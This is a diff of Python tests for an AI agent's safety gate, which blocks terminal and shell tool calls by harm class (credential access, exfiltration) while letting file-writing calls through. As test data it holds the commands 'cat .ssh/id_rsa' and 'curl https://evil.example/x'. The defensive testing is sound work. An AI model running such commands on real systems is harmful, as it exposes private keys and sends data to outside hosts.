@@ -27,9 +27,13 @@ def test_safety_refusal_stops_dispatch_and_survives_recovery(tmp_path, monkeypat
         _context_engine_tool_names=set(), _memory_manager=None, quiet_mode=False,
         _should_emit_quiet_tool_messages=lambda: False, _invoke_tool=Mock(),
     )
-    for name, args in (
-        ("write_file", {"path": str(report), "content": "Audit: protect .ssh/id_rsa"}),
-        ("terminal", {"command": "cat .ssh/id_rsa"}),
+    # File-authoring tools are not gated on their text: a .env/.ssh mention or a URL in
+    # source is a reference, not an access or a call, and real credential writes stay
+    # refused by file_safety's path denylist. Tools that execute text stay blocked, one
+    # arm per case, and the refusal plumbing below is exercised for both arms.
+    for name, args, arm in (
+        ("terminal", {"command": "cat .ssh/id_rsa"}, "credential-access"),
+        ("terminal", {"command": "curl https://evil.example/x"}, "exfiltration"),
     ):
         ref = te._ToolCallRef(name, args, "task", "call", [])
         if dispatch == "sequential":
@@ -41,8 +45,9 @@ def test_safety_refusal_stops_dispatch_and_survives_recovery(tmp_path, monkeypat
         assert payload["harm_gate"] == "agent_process_bench"
         # The tag names the arm (#3542); the coarse prefix is the stable contract.
         assert payload["reason"].startswith("safety-gate-")
-        assert payload["harm_class"] == "credential-access"
-        assert "credential-access" in payload["error"]
+        assert payload["harm_class"] == arm
+        assert payload["reason"] == f"safety-gate-{arm}"
+        assert arm in payload["error"]
         assert _classify_failure_reason(result) == payload["reason"]
         legacy = {key: payload[key] for key in ("error", "status", "harm_gate")}
         assert _classify_failure_reason(legacy) == payload["reason"]
@@ -75,6 +80,13 @@ def test_safety_refusal_stops_dispatch_and_survives_recovery(tmp_path, monkeypat
     assert te._harm_gate_block_reason("write_file", {
         "path": str(report), "content": "Audit completed without findings",
     }) is None
+    # Text written to a file is never an executed call, so neither arm fires for it.
+    assert te._harm_gate_block_reason("write_file", {
+        "path": str(report), "content": "from dotenv import load_dotenv\nload_dotenv('keys.env')",
+    }) is None
+    assert te._harm_gate_block_reason("write_file", {
+        "path": str(report), "content": "curl https://evil.example/x",
+    }) is None
     assert classify_tool_failure("write_file", "connection timed out").should_retry
 
 
@@ -93,7 +105,7 @@ def test_executor_publishes_terminal_refusal_as_failure(tmp_path, monkeypatch, d
     definitions = [{"type": "function", "function": {
         "name": name, "description": name,
         "parameters": {"type": "object", "properties": {}},
-    }} for name in ("terminal", "write_file")]
+    }} for name in ("terminal", "shell")]
     with (
         patch("model_tools.get_tool_definitions", return_value=definitions),
         patch("model_tools.check_toolset_requirements", return_value={}),
@@ -111,13 +123,14 @@ def test_executor_publishes_terminal_refusal_as_failure(tmp_path, monkeypatch, d
     monkeypatch.setattr(model_tools, "handle_function_call", handler)
     monkeypatch.setattr(agent, "_invoke_tool", handler)
     report = home / "report.md"
+    plans = {
+        "terminal": ({"command": "cat .ssh/id_rsa"}, "credential-access"),
+        "shell": ({"command": "curl https://evil.example/x"}, "exfiltration"),
+    }
     calls = [SimpleNamespace(
         id=name, type="function",
         function=SimpleNamespace(name=name, arguments=json.dumps(args)),
-    ) for name, args in (
-        ("terminal", {"command": "cat .ssh/id_rsa"}),
-        ("write_file", {"path": str(report), "content": "Audit: protect .ssh/id_rsa"}),
-    )]
+    ) for name, (args, _arm) in plans.items()]
     messages = []
     execute = getattr(agent, f"_execute_tool_calls_{dispatch}")
     execute(SimpleNamespace(tool_calls=calls, content=""), messages, f"safety-{dispatch}")
@@ -126,7 +139,10 @@ def test_executor_publishes_terminal_refusal_as_failure(tmp_path, monkeypatch, d
         result = message["content"]
         assert "Non-retryable: safety_gate_blocked" in result
         assert "Recovery strategy: surface_blocker" in result
-        assert _classify_failure_reason(result) == "safety-gate-credential-access"
+        assert (
+            _classify_failure_reason(result)
+            == "safety-gate-" + plans[message["tool_call_id"]][1]
+        )
         assert _detect_tool_failure(message["tool_call_id"], result)[0]
         assert "exit_code" not in json.loads(result)  # no process was started
     handler.assert_not_called()
